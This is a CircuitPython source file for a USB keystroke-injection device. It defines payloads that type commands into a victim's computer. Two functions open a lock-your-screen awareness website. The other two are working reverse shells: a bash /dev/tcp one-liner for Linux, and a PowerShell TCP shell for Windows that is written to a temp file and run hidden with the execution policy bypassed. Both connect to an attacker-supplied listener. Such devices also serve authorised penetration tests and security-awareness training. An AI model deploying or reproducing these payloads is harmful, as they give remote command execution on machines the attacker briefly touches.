'''
Defines functions to run payloads.
'''

import usb_hid

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from time import sleep


SETUP_WAIT_TIME = 1
UI_WAIT_TIME = 0.25
COMMAND_WAIT_TIME = 0.5


def lockScreenAwarnessWindows() -> None:
    '''
    Run a lock screen awarness payload for Windows.
    '''
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    sleep(SETUP_WAIT_TIME)
    keyboard.send(Keycode.GUI, Keycode.R)
    sleep(UI_WAIT_TIME)
    keyboard_layout.write('https://eyelockmyscreen.com/\n')
    sleep(COMMAND_WAIT_TIME)
    keyboard.send(Keycode.F11)


def lockScreenAwarnessLinux(kdePlasma: bool) -> None:
    '''
    Run a lock screen awarness payload for Linux.
    :param bool kdePlasma: True for Kde Plasma system,
    False for Gnome/Xfce/Cinnamon systems.
    '''
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    sleep(SETUP_WAIT_TIME)
    if (kdePlasma):
        keyboard.send(Keycode.ALT, Keycode.SPACE)
    else:
        keyboard.send(Keycode.ALT, Keycode.F2)
    sleep(UI_WAIT_TIME)
    keyboard_layout.write('xdg-open https://eyelockmyscreen.com/\n')


def reverseShellBash(listenerIP: str, listenerPort: str, kdePlasma: bool) -> None:
    '''
    Run a Bash reverse shell payload for Linux.
    :param str listenerIP: IP address of the listener.
    :param str listenerPort: port of the listener.
    :param bool kdePlasma: True for Kde Plasma system,
    False for Gnome/Xfce/Cinnamon systems.
    '''
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    sleep(SETUP_WAIT_TIME)
    if (kdePlasma):
        keyboard.send(Keycode.ALT, Keycode.SPACE)
    else:
        keyboard.send(Keycode.ALT, Keycode.F2)
    sleep(UI_WAIT_TIME)
    keyboard_layout.write('bash -c "bash -i >& /dev/tcp/'
                          + listenerIP + '/' + listenerPort
                          + ' 0>&1"\n')


def reverseShellPowerShell(listenerIP: str, listenerPort: str) -> None:
    '''
    Run a PowerShell reverse shell payload for Windows.
    :param str listenerIP: IP address of the listener.
    :param str listenerPort: port of the listener.
    '''
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    sleep(SETUP_WAIT_TIME)
    commands = ['cmd /c echo $LHOST = "' + listenerIP + '"; $LPORT = ' + listenerPort + '; > %TEMP%\\rshell.ps1\n',
                'cmd /c echo $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); >> %TEMP%\\rshell.ps1\n',
                'cmd /c echo $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); >> %TEMP%\\rshell.ps1\n',
                'cmd /c echo $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; >> %TEMP%\\rshell.ps1\n',
                'cmd /c echo while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);  >> %TEMP%\\rshell.ps1\n',
                'cmd /c echo $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; >> %TEMP%\\rshell.ps1\n',
                'cmd /c echo if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; >> %TEMP%\\rshell.ps1\n',
                'cmd /c echo $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() >> %TEMP%\\rshell.ps1\n',
                'cmd /c powershell -w hidden -ep bypass %TEMP%\\rshell.ps1\n']
    for command in commands:
        keyboard.send(Keycode.GUI, Keycode.R)
        sleep(UI_WAIT_TIME)
        keyboard_layout.write(command)
        sleep(COMMAND_WAIT_TIME)
